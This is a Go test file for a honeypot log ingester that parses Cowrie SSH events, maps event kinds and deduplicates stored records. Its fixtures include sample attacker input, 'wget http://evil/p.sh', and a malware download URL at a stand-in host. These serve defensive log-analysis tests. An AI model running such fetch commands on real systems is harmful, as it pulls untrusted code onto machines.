package cowrie

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/store"
	"github.com/networkshard/shardlure/pkg/models"
)

func TestToEventCommand(t *testing.T) {
	rec := cowrieLine{
		EventID:    "cowrie.command.input",
		Timestamp:  "2026-05-21T12:00:00.000000Z",
		SrcIP:      "1.2.3.4",
		SrcPort:    4242,
		Username:   "root",
		Session:    "abc",
		Input:      "wget http://evil/p.sh",
		HASSH:      "hassh-123",
		SSHVersion: "SSH-2.0-libssh",
	}
	e, ok := toEvent(rec, `{"eventid":"cowrie.command.input"}`)
	if !ok {
		t.Fatalf("expected event to parse")
	}
	if e.Kind != "command" {
		t.Fatalf("expected command kind, got %s", e.Kind)
	}
	if e.HASSH != "hassh-123" {
		t.Fatalf("expected hassh, got %q", e.HASSH)
	}
	if e.Command == "" {
		t.Fatalf("expected command text")
	}
}

func TestToEventFileDownload(t *testing.T) {
	rec := cowrieLine{
		EventID:   "cowrie.session.file_download",
		Timestamp: "2026-05-21T12:00:00.000000Z",
		SrcIP:     "1.2.3.4",
		Session:   "s1",
		URL:       "http://evil.example/malware",
		Outfile:   "/var/lib/cowrie/downloads/abc123",
		SHA256:    "deadbeef",
	}
	e, ok := toEvent(rec, `{}`)
	if !ok {
		t.Fatal("expected parse")
	}
	if e.Kind != models.KindFileDown {
		t.Fatalf("kind=%s", e.Kind)
	}
	if e.Command != "http://evil.example/malware" {
		t.Fatalf("command=%q", e.Command)
	}
	if e.Filename != "/var/lib/cowrie/downloads/abc123" {
		t.Fatalf("filename=%q", e.Filename)
	}
}

func TestMapKindTunnel(t *testing.T) {
	k, ok := mapKind("cowrie.direct-tcpip.request")
	if !ok {
		t.Fatalf("expected tunnel kind")
	}
	if k != "tunnel" {
		t.Fatalf("expected tunnel, got %s", k)
	}
}

func TestParseReaderCountsSkippedLines(t *testing.T) {
	input := strings.Join([]string{
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","username":"root","session":"s1"}`,
		`{"eventid":`,
		`{"eventid":"cowrie.login.failed","timestamp":"not-a-time","src_ip":"1.2.3.4","username":"root","session":"s2"}`,
		`{"eventid":"cowrie.unknown","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4"}`,
	}, "\n")
	events, skipped, _, err := parseReader(strings.NewReader(input))
	if err != nil {
		t.Fatalf("parseReader: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected 1 parsed event, got %d", len(events))
	}
	if skipped != 3 {
		t.Fatalf("expected 3 skipped lines, got %d", skipped)
	}
}

func TestIngestFileReplaceKeepsJournalDataAndPersistsActorID(t *testing.T) {
	st := openTestStore(t)
	defer st.Close()

	journalEvent := &models.Event{
		TS:     time.Date(2026, 5, 21, 10, 0, 0, 0, time.UTC),
		Source: models.SourceJournal,
		Kind:   models.KindInvalidUser,
		SrcIP:  "203.0.113.10",
		Raw:    "journal-line",
	}
	if err := st.InsertEvent(journalEvent); err != nil {
		t.Fatalf("insert journal event: %v", err)
	}
	if err := st.UpsertActor(&models.Actor{
		ID:         "journal:203.0.113.10",
		Source:     models.SourceJournal,
		PrimaryIP:  "203.0.113.10",
		FirstSeen:  journalEvent.TS,
		LastSeen:   journalEvent.TS,
		EventCount: 1,
	}); err != nil {
		t.Fatalf("insert journal actor: %v", err)
	}

	path := writeTempCowrieLog(t, `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"username":"root","session":"s1","hassh":"h1"}`)
	if _, err := IngestFile(st, path, nil, true); err != nil {
		t.Fatalf("ingest replace: %v", err)
	}

	events, err := st.EventsBySource(models.SourceJournal)
	if err != nil {
		t.Fatalf("load journal events: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected journal event to survive cowrie replace, got %d", len(events))
	}

	cowrieEvents, err := st.EventsBySource(models.SourceCowrie)
	if err != nil {
		t.Fatalf("load cowrie events: %v", err)
	}
	if len(cowrieEvents) != 1 {
		t.Fatalf("expected 1 cowrie event, got %d", len(cowrieEvents))
	}
	if cowrieEvents[0].ActorID == "" {
		t.Fatalf("expected cowrie event actor_id to be persisted")
	}
}

func TestIngestFileAppendDedupsByEventIdentity(t *testing.T) {
	st := openTestStore(t)
	defer st.Close()

	first := writeTempCowrieLog(t, `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"username":"root","session":"s1","hassh":"h1"}`)
	second := writeTempCowrieLog(t, `{ "eventid" : "cowrie.login.failed", "timestamp" : "2026-05-21T12:00:00.000000Z", "src_ip" : "1.2.3.4", "src_port" : 2222, "username" : "root", "session" : "s1", "hassh" : "h1" }`)

	if _, err := IngestFileAppend(st, first, nil); err != nil {
		t.Fatalf("first append: %v", err)
	}
	if _, err := IngestFileAppend(st, second, nil); err != nil {
		t.Fatalf("second append: %v", err)
	}
	events, err := st.EventsBySource(models.SourceCowrie)
	if err != nil {
		t.Fatalf("load cowrie events: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected duplicate append to keep 1 event, got %d", len(events))
	}
}

func openTestStore(t *testing.T) *store.Store {
	t.Helper()
	st, err := store.Open(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	return st
}

func writeTempCowrieLog(t *testing.T, line string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "cowrie.json")
	if err := os.WriteFile(path, []byte(line+"\n"), 0o644); err != nil {
		t.Fatalf("write cowrie log: %v", err)
	}
	return path
}
